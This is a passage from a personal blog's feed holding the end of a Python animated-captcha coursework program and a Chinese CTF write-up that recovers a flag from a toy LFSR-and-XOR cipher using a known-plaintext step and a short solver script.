self.LineConfusion(createpic)</span><br><span class="line"></span><br><span class="line">            self.ArcConfusion(createpic)</span><br><span class="line"></span><br><span class="line">            PNGfile = BytesIO()</span><br><span class="line">            DVC.save(PNGfile, <span class="string">&quot;png&quot;</span>)</span><br><span class="line">            data = PNGfile.getvalue()</span><br><span class="line">            PNGfile.close()</span><br><span class="line"></span><br><span class="line">            data = imageio.imread(data, <span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">            picSequence.append(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> picSequence, <span class="string">&quot;&quot;</span>.join(StrInDVCList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GUI</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.ans = self.DVCCreate()</span><br><span class="line">        self.root = Tk()</span><br><span class="line">        self.root.geometry(<span class="string">&#x27;500x400+500+300&#x27;</span>)</span><br><span class="line">        self.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        self.root.title(<span class="string">&quot;Dynamic Verification Code&quot;</span>)</span><br><span class="line">        self.anim = LabelDisplay(self.root, <span class="string">&#x27;Dynamic_verification_code.gif&#x27;</span>)</span><br><span class="line">        self.anim.pack(side=<span class="string">&quot;top&quot;</span>)</span><br><span class="line">        self.entryCode = tkinter.Entry(self.root)</span><br><span class="line">        self.entryCode.place(x=<span class="number">150</span>, y=<span class="number">200</span>, width=<span class="number">200</span>, height=<span class="number">30</span>)</span><br><span class="line">        self.w = Label(self.root, text=<span class="string">&quot;Please enter the verification code below:&quot;</span>)</span><br><span class="line">        self.w.place(x=<span class="number">121</span>, y=<span class="number">168</span>)</span><br><span class="line">        self.ww = Label(self.root, text=<span class="string">&quot;Cybersecurity Coursework  Build Date: December 8, 2021&quot;</span>, font=(<span class="string">&#x27;Consolas&#x27;</span>, <span class="number">8</span>),</span><br><span class="line">                        fg=<span class="string">&#x27;DarkRed&#x27;</span>)</span><br><span class="line">        self.ww.place(x=<span class="number">135</span>, y=<span class="number">382</span>)</span><br><span class="line">        self.www = Label(self.root,</span><br><span class="line">                         text=<span class="string">&quot;You can refer to the comments to adjust the parameters of the DynamicVerificationCode(&quot;</span></span><br><span class="line">                              <span class="string">&quot;) function to adjust the style of the dynamic verification code.&quot;</span>,</span><br><span class="line">                         wraplength=<span class="number">244</span>,</span><br><span class="line">                         font=(<span class="string">&#x27;Consolas&#x27;</span>, <span class="number">10</span>))</span><br><span class="line">        self.www.place(x=<span class="number">135</span>, y=<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">        self.btnCheck = tkinter.Button(self.root, text=<span class="string">&#x27;Submit&#x27;</span>, width=<span class="number">20</span>, height=<span class="number">2</span>, command=self.check)</span><br><span class="line">        self.btnCheck.pack(side=<span class="string">&#x27;bottom&#x27;</span>, pady=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        self.btnRe = tkinter.Button(self.root, text=<span class="string">&#x27;Refresh&#x27;</span>, width=<span class="number">20</span>, height=<span class="number">2</span>, command=self.Re)</span><br><span class="line">        self.btnRe.place(x=<span class="number">158</span>, y=<span class="number">75</span>)</span><br><span class="line">        self.root.mainloop()</span><br><span class="line">        self.Re()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DVCCreate</span>(<span class="params">self</span>):</span></span><br><span class="line">        img = DynamicVerificationCode(<span class="number">200</span>, <span class="number">55</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">3</span>, <span class="number">30</span>)</span><br><span class="line">        <span class="comment"># 宽度，高度，位数，字体大小，干扰点数量，干扰线段数量，帧数</span></span><br><span class="line">        seq, ans = img.Create()</span><br><span class="line">        imageio.mimsave(<span class="string">&quot;Dynamic_verification_code.gif&quot;</span>, seq, <span class="string">&#x27;GIF&#x27;</span>, duration=<span class="number">0.3</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The verification code characters are &quot;</span> + ans)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># print(self.ans)</span></span><br><span class="line">        <span class="keyword">if</span> self.entryCode.get() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            tkinter.messagebox.showerror(<span class="string">&#x27;DVC Fatal Error&#x27;</span>, <span class="string">&#x27;The verification code is empty!&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.entryCode.get() == self.ans:</span><br><span class="line">                tkinter.messagebox.showwarning(<span class="string">&#x27;DVC Success&#x27;</span>, <span class="string">&#x27;Successfully verified!&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tkinter.messagebox.showerror(<span class="string">&#x27;DVC Fail&#x27;</span>, <span class="string">&#x27;Verification code error! Please try again.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Re</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">        self.ans = self.DVCCreate()</span><br><span class="line">        self.anim.pack_forget()</span><br><span class="line">        self.anim = LabelDisplay(self.root, <span class="string">&#x27;Dynamic_verification_code.gif&#x27;</span>)</span><br><span class="line">        self.anim.pack(side=<span class="string">&quot;top&quot;</span>)</span><br><span class="line">        self.root.update()</span><br><span class="line">        <span class="comment"># return ans</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    GUI()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note info flat&quot;&gt;&lt;p&gt;本项目是《网络安全A》课程的一项附加作业&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;本项目主要分</summary>
      
    
    
    
    
    <category term="课程作业" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="Python" scheme="https://zxy.link/tags/Python/"/>
    
    <category term="网络安全A" scheme="https://zxy.link/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8A/"/>
    
  </entry>
  
  <entry>
    <title>LFSRXOR题解</title>
    <link href="https://zxy.link/posts/6ced4cb0/"/>
    <id>https://zxy.link/posts/6ced4cb0/</id>
    <published>2021-12-07T08:06:49.000Z</published>
    <updated>2022-01-22T12:42:25.541Z</updated>
    
    <content type="html"><![CDATA[<p>题目给出了一个Python加密算法，将代码稍作修改如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pylfsr <span class="keyword">import</span> LFSR</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;DASCTF&quot;</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">chr</span>(a ^ b)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        tmp += xor(content[i], key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shuffle_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str_list = <span class="built_in">list</span>(s)</span><br><span class="line">    random.shuffle(str_list)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> str_list).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ran_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(random.randint(<span class="number">1</span>, <span class="number">256</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)).encode()</span><br><span class="line">content = ran_str + flag</span><br><span class="line"></span><br><span class="line">L4 = LFSR(fpoly=[<span class="number">4</span>, <span class="number">3</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L4.runFullCycle()</span><br><span class="line">k4 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    a = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        a += <span class="built_in">str</span>(L4.<span class="built_in">next</span>()).encode()</span><br><span class="line">    k4 += long_to_bytes(<span class="built_in">int</span>(a, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">L5 = LFSR(fpoly=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L5.runFullCycle()</span><br><span class="line">k5 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    a = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        a += <span class="built_in">str</span>(L5.<span class="built_in">next</span>()).encode()</span><br><span class="line">    k5 += long_to_bytes(<span class="built_in">int</span>(a, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">k4 = shuffle_str(k4)</span><br><span class="line">k5 = shuffle_str(k5)</span><br><span class="line"></span><br><span class="line">enc2 = encode(content, k5)</span><br><span class="line">enc1 = encode(content, k4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc1)</span><br><span class="line"><span class="built_in">print</span>(enc2)</span><br></pre></td></tr></table></figure><p>经过分析，该代码通过调用pylfsr包的LFSR函数生成了L4和L5，进过处理后分别赋值给k4和k5变量，相关代码如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L4 = LFSR(fpoly=[<span class="number">4</span>, <span class="number">3</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L4.runFullCycle()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L5 = LFSR(fpoly=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>], initstate=<span class="string">&#x27;random&#x27;</span>, verbose=<span class="literal">True</span>)</span><br><span class="line">data = L5.runFullCycle()</span><br></pre></td></tr></table></figure><p>然后调用<code>random.shuffle()</code>函数将两个密钥打乱。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k4 = shuffle_str(k4)</span><br><span class="line">k5 = shuffle_str(k5)</span><br></pre></td></tr></table></figure><p>最后调用<code>encode()</code>函数将两个密钥进行循环异或，密钥Key循环使用，得到最终的enc1和enc2。下面我们使用Python的交互式模式查看一下两个密钥的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">L4.info()</span><br><span class="line"><span class="number">4</span> bit LFSR <span class="keyword">with</span> feedback polynomial  x^<span class="number">4</span> + x^<span class="number">3</span> + <span class="number">1</span></span><br><span class="line">Expected Period (<span class="keyword">if</span> polynomial <span class="keyword">is</span> primitive) =  <span class="number">15</span></span><br><span class="line">Current :</span><br><span class="line"> State        :  [<span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span>]</span><br><span class="line"> Count        :  <span class="number">15</span></span><br><span class="line"> Output bit   :  <span class="number">1</span></span><br><span class="line"> feedback bit :  <span class="number">0</span></span><br><span class="line"> Output <span class="type">Sequence</span> <span class="number">111000100110101</span></span><br></pre></td></tr></table></figure><p>调用pylfsr包的info()函数可以看出，L4的一些信息。但是因为<code>initstate=&#39;random&#39;</code>参数，所以这里我们主要关注Expected Period = 15，同样查看一下L5的info。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">L5.info()</span><br><span class="line"><span class="number">5</span> bit LFSR <span class="keyword">with</span> feedback polynomial  x^<span class="number">5</span> + x^<span class="number">4</span> + x^<span class="number">2</span> + x^<span class="number">1</span> + <span class="number">1</span></span><br><span class="line">Expected Period (<span class="keyword">if</span> polynomial <span class="keyword">is</span> primitive) =  <span class="number">31</span></span><br><span class="line">Current :</span><br><span class="line"> State        :  [<span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span>]</span><br><span class="line"> Count        :  <span class="number">0</span></span><br><span class="line"> Output bit   :  -<span class="number">1</span></span><br><span class="line"> feedback bit :  -<span class="number">1</span></span><br></pre></td></tr></table></figure><p>可以看出Expected Period = 31，这说明两个密钥的长度分别为<code>15</code>和<code>31</code>。通过<code>content = ran_str + flag</code>语句，content显然由随机字符串和flag构成，由于flag的特性，我们可以得出content的最后一个字符必定是’}’，也就是说enc变量最后一个字节和’}’异或必将是密钥的其中一位。通过这个信息，我们便可以着手破解密钥。</p><p>首先我们要搞清该题用到的一点数论基础。由于异或的性质，<code>k4</code>可以由<code>k5</code>与enc1和enc2异或计算得到。<br>$$<br>\because  Content_{i} ⊕ k4_{i\ mod\  15} = enc1_{i}\tag{1}<br>$$</p><p>$$<br>Content_{i} ⊕ k5_{i\ mod\  31} = enc2_{i}\tag{2}<br>$$</p><p>$$<br>\therefore k4_{i\ mod\  15} = k5_{i\ mod\  31} ⊕ enc1_{i} ⊕ enc2_{i}\tag{*}<br>$$</p><p>通过代码最后的注释，我们可以得到enc2的长度为810位，又因为k5为31位，因此enc2最后一个字节肯定是由<code>k5[810%31 - 1]</code>即<code>k5[3]</code>异或得到。写成Python代码即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k5[<span class="number">3</span>] = enc2[<span class="number">809</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>根据(*)式的原理，不断进行for循环，当周期足够多时，就可以得到k4的所有字节，自然也会得到flag。这里要注意，因为k5比k4多一个字节，因此k4的所有字节均可通过循环异或得到，所以最后输出k4的解密结果，如果搞反会出错。脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">enc1 = <span class="string">b&#x27;\xbb\xd3\x08\x15\xc6:\x08\xb2\xb2\x9f\xe4p\xc7\xec\x7f\xfd)\xf6f\x9c\xe4\xd12\xaeJ\x81\xb1\x88\xab\xa5V\xa9\x88\x14\xdf`~\xf6\xdbJ\xb4\x06S!0\xbb\xe4\x1a\xe6R\x8e\x84X\x19K\x95\x07C\xe8\xb2\&#x27;\xa9\x80\x15\xec\x8f\x8dY\nK\x85\x99\xb7!\x134\xa9\xb6\x15\xcf&amp;\r\x9b\xe1\x99\xe4]3h~\xf0\xa9\xa5\x14\xee&#125;\xd19l\x14h\x07v *a0\x12\x14\xfe\x0f\x05\xdem\x1d\xe4s2J\x7f\xc28\xf6RR\x8e\xba\xb2m\x18M\xf1\xef!4\x17\xa8\xb4\x14\xc2\x8f\xb9Y:K\xaa\x06T!\x1b\xbb\xfd\xf6Gv\x8e\x9a\xeb\xd9K\xbb\x06N\x9a\x82c\xa9\xa0\x14\xed!\x04\xdbm\x13\xe5w3B\x7f\xd0\xa9\xbf\xb7\x9c\xe3\xd00\x83K\x86\xab3\x7f\xc1\xbb\xfd\x11\x15\xdf\x8e\x80Y\x07\xd8\xe5]2m\xe9\xbb\xce`\x91o\x8f\x8cY!\x81\xe4J\x92\x8c\xa7T\x16E\x15\xf1WMY(\xb8[\x8e2y~\xcbM\x10\x15\xc7\x1fWY\x0cK\x87\xce\xe5 !b\xa8\x83\x14\xec6\xd1!\xc8\x905\xe52L\xf1\xba\xcf\n\x9d\x9d\xe7u\xadm\x06\xe4n2r\xd8\xba\xed\xf6\x7f\x9d\xd8\xd02m\x12G\x07Y\x89\x7f\xc0\xa8\xa4\x15\xe5\x043Y\x1eJ\xae\x07n\x94\x87\xbb\xcf_\x8d\x9d\xd1\x14Y,\x9e\xe5b\xd7\x8c\x7f\xf7\xa8\x8f\x14\xc7\x8f\xb3\xb6\xf1\x93\xe4O\xdd\xc4\xdb\xba\xf6!\x15\xfd.\xd1\x18\xcf\xf6\x03\xea2E\x7f\xe1\xa9\xa5\xfe\x9d\xc9\xd1;\xd9\xee\x05\x06z\xc8\xb2\xbb\xe2\xf7&#123;JW4\xcdm\x1a\xe5U\x8d \x0f&amp;\x14\x7f\xf6\x9d\xd4E\xbf\xc3\xdb\xe4L\xe1\xf7\x90\xbb\xdaZ\xf4\x9d\xd13\xb8m3\xe2D3o~\xf8H\xf6U*\x07lY\x03K\xab\x07~\xa3\x87\xbb\xc9\xf7sAQ\x08Y6J\x86\x07Y\xec\xf7\xbb\xc6s\x15\xc6\x7fEY\x02J\x95\x07Z \x11\xbb\xc6T\x15\xfc-\xd0\x06\xe6\x9f-\x07^ \x15\xbb\xccz\x14\xf3\x8f\x97\xd4l9t\x85\xe8\x8a\xbe\xbb\xf9\xf6f\x9d\xf2\xd19\xa2K\xb6\xcd\xcf\xf6~\xd5\xa9\xaa\x15\xd8\x8e\xb3\x81m9\xe4f\xb2!\x1e\xba\xd8s\xfd\x11\x08W\xa1l;\x01\x07_!\x11\xbb\xdd\xf6x\x9d\xf0\x17Y\x15\xfe\x02\xc7\xa0!.W\xa9\xa5\x8f\x9c\xe8\xd1\x12m\x04\xe5s3Q~\xdd\xa9\xa3\x15\xdb\x8f\xac\xaf\xec\xbb\x10\xde2_\xba\xba\xe8\xf6f.\x1e\xd1\x17l\x06\xe4U\xdd\xf0\xd6~\x0fA\x14\xcb\x8e\xb0Y\x1fJ\xb2\xe4\xb3!&quot;\xba\xfeU\x14\xedY\xd0&gt;l-~\x06P 1\xbb\xf2\xf6waD\xd1(m\x12`\x06@\xb6~\xfa\xa9\xb1\xb0\x9d\xfb\x18\xfbm&amp;\xe4v2w\xce\xba\xcbo\xd5\x07\x11QX&lt;J\xbd\xb22O\x7f\xd8x&gt;\xc8\x9c\xd3\xd03\x9d\xb5\x1e\xd72S\xf2ry\xf1W\x9c\xc89Y\rK\x8f\xff\x8a\xe0\xb5&#123;\xa9\xae\xb1\x9d\xdd\xd1=\xbeK\xa3\x06e!\x08\xba\xd2\xf6j\x9c\xf6\xd0\x0fl#\xe5o\xf5\xaa~\xc2\xa9\x99\x15\xea6\xd1:\xe7\xa8\xe4n\xbb \nV\xa9\x91\x14\xf9&#125;\xd0!m/\xe5|2o\x81\xba\xf8\r\x14\xeb\tR\xc9\xec\xdd`\xbf\xc6\x81\xdfKXW\xb3o.%\xa9\xcd\xb9\x14\xfd\x97\x83\x8eO\n\x03\xb6iuu\xab\x9d\xbc\x15\xf4\xc3\xd6\xc1&#x27;</span></span><br><span class="line">enc2 = <span class="string">b&#x27;p\xfd\x1ff\xcaB\xa5\xe6`\x87\xa8\x8ci\x855\x92O8P\xa5&#125;^\xd8\xed\x1a\x88=c\xe0\x9f\xedq\xf8\xe1%\x7fX\xd2\xba\xbe\x03\xa8\x9a\x9c\x075\x98&quot;\xca\xed\xa4C^\xc6.j\xec\xfa\x10\xa7\xd9\x01\x06\x87\x90f\xcc\xf6\x1b\x0c\xde\xcc,\xfb\xf0\xc74\x94\xcfj\x8ay\xd5\xd2`.@\xed\xc2\xd8!DSp\xf5\x12f\xf1\xf6#\x80\xbe\x16\xa8\xaeF\xd0\xd1\xd4\xad\xb9\xf7#\x16\x08\xb2[\x1a\x87\x8b\xa0\xfaEF\xbf\x86\x8b\x8c\x90\xa4\xd5\xfbcR\xe2W\x9c\n5\x8b\xcfQ&quot;\xf2\x16\x10\xb2I\x1a\x88\x8b\x8cj\x16\xebp\xccS\xd2\x90\xa8|q\x05\xafq\xfa\xcaHE&#123;\x1a\xba#\xfd\x17/\xb2L\x1a\x87\x8a\x90\xc9Dmp\xef\x0ef\xf2Z|S\x00R\xfc\x1c\x9d\n5\x84\xceS\xb0\xa4M_\xff\xb9\x1a\x8a\x1d\\\x98D\\p\xcb*f\xdcV\xd0\xd5Q\xec\x1a\xfa\xf0\x91\xa8\xd4\x8a\xca\x9c-\x17\x07\xb2_\xff\n\x8a\x83\xfb\xc2\x00\x10\x87\x83\xaeF\xf7#\xd4\xbe\&#x27;\xa9\x8a$IMp\x14\xe8\xc0\xa4z\xd1\xb2H\xe6e\x8b\xb0\xcf\xb1\x01&lt;\x87\x88g\xc2Q|H\xbe9\xa9\xad\x9c#4\x8cl8I\x0c\x17$\xb3&#125;\x1b\x94\x01:j7\x00;\x86\xbd\xd2i\xf6\x1a\xa4\&#x27;R\xf6?\x9c\x08\xe1\xd4\xab\xdd\x8f\xa4[_\xca/@\xed\xe86\xf7\x9c\x018i\x04\xc3\x90\xa8\xaa\x0c\xde\xf2\xa8\xba?\xf4\xd39\xce\\&quot;\xfe\x16\x0cY/]\xed\xe9l\xce\xa5\x018o,g\xdb\xf7\x12\xdag\xb6=\xfa\xccHgk\xcfH\xbf\x18\x9e\xbd\xb3u\x8f\n$Hk\x0e\xd3\xa6i\xe1\x15=\x16&#125;R]\xb3\xa8\x82\x9b\x0b4\x9a\xcf&#123;\xc2\xa4V\xe8:\x93\x1a\x83\x8a\x97j\t\x82\x88\x86\x80f\xf6*\xa2\xd5\xbe\x08\xa9\x98\x9c#\xf8\\\xceV\xa7\xa5L\xae&amp;/t\xec\xfb\xd9\x02Dnp\xe8Cf\xf0U&#125;R4\x87a\xfb\xf0I_\xd4\xaa\xb4&quot;\xca\x16\x18&gt;/i&#125;\t\x03\xc1\x84\x00!\x86\x93g\xed\xf7\x1d\xc3\xbf\x01c\x06KI[\xd5\x929g\xa4t\x87\xb2\\\x1b\x8d\x0b\xd9\x0bDp\xf5om\xe1\x16\x0e&#125;|ZR\xc4\xfb\xf2H@\xd4\xa28\\c\x17&amp;\x07\xc8\xda~\x8b\x88\x86DS\xeb\x87\x87f\xda\xf73\r\xcaS\xd9\xfa\xfaI`\xd5\x889^R\x97\xaeF\xf6\x1a\x92N\xd8*Er\xc3\x16\xe0)\x91\xba|_Q\x83\x00&gt;;\xff5\x82\xceX&quot;\xd7\x17\x08P\xae\x1a\xb1\x8a\x8f\xc9Ep\xa7\x86\x86g\xf6m|o\xbf\x1c\xa9\xa1\x9c+\xc9\x1e\xcfI#\xfc\x92^\xc1\xb8\x1b\xad\x8a\x9e\xceEu\xb8$\xe0\x0b\x90\x87&#125;[\x0fS\xcab]\xd2\xaaU\xcfh&quot;\xfc\xa2_\xdd/y&lt;C\x05k\x18\x00\x1aw\x1e\x9cA\xf6\x0f\x80w\x83\xae\xb8\x9d\x0e\xdc\xd4\xaf9H\\\xaf\x9ey\xef\x1b\xb4.\xd99Dd\xa2\x87\xa7f\xc6\xf6\n\x0c\xc4R\xd7\xfa\xe4Hc\xd4\xa78Jc\x9c^\xca.u\xed\xfcak&amp;\x8b\x92\x87\x88\xee\x90\x83\x90\x0c\xd9R\xcd\x08\x9c04\xb1\xceC&quot;\xea\xe9^\xe3\xd4\x1a\x9a\x0c[\xfa\xc5\x97\xf5&gt;\x15\xc71\x06\x8d\xac\x19\xa0\t\x0el\xe9\xc6%4\x9d\x80U\xe3\xfdF\x8d\xee\x17.+\x9b\xb3\xf0\x83w\x16\xd9&#x27;</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;&quot;</span></span><br><span class="line">k5 = []</span><br><span class="line">k4 = []</span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    k4.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    k5.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">k5[<span class="number">3</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>) ^ enc2[<span class="number">809</span>]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">810</span>, <span class="number">31</span>):</span><br><span class="line">    k4[c % <span class="number">15</span>] = k5[<span class="number">3</span>] ^ enc1[c] ^ enc2[c]</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">810</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(k4[c % <span class="number">15</span>] ^ enc1[c]) <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(k4[c % <span class="number">15</span>] ^ enc1[c]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目给出了一个Python加密算法，将代码稍作修改如下所示。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="密码学" scheme="https://zxy.link/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="课程作业" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
    <title>Java语言及网络编程作业</title>
    <link href="https://zxy.link/posts/2f9013ea/"/>
    <id>https://zxy.link/posts/2f9013ea/</id>
    <published>2021-11-20T04:47:00.000Z</published>
    <updated>2022-01-23T12:30:07.553Z</updated>
    
